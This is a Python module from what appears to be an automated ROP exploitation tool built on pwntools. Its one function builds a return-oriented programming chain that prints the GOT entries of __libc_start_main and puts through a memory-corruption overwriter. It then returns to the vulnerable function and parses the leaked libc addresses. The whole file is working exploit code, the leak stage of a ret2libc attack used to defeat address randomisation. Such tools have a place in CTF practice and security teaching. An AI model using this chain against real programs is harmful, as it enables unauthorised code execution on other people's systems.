from autorop import PwnState, arutil, constants
from pwn import ROP, log


def puts(state: PwnState) -> PwnState:
    """Leak libc addresses using `puts`.

    This function leaks the libc addresses of `__libc_start_main` and `puts`
    using `puts`, placing them in `state.leaks`.
    It expects the `state.overwriter` is set."""
    LEAK_FUNCS = ["__libc_start_main", "puts"]
    rop = ROP(state.elf)
    for func in LEAK_FUNCS:
        rop.puts(state.elf.got[func])
    rop.call(state.vuln_function)  # return back so we can execute more chains later
    log.info(rop.dump())

    state.target.clean(constants.CLEAN_TIME)
    arutil.call_overwriter(state, rop.chain())

    for func in LEAK_FUNCS:
        line = state.target.readline()
        log.debug(line)
        # remove last character which must be newline
        state.leaks[func] = arutil.addressify(line[:-1])
        log.info(f"leaked {func} @ " + hex(state.leaks[func]))

    return state
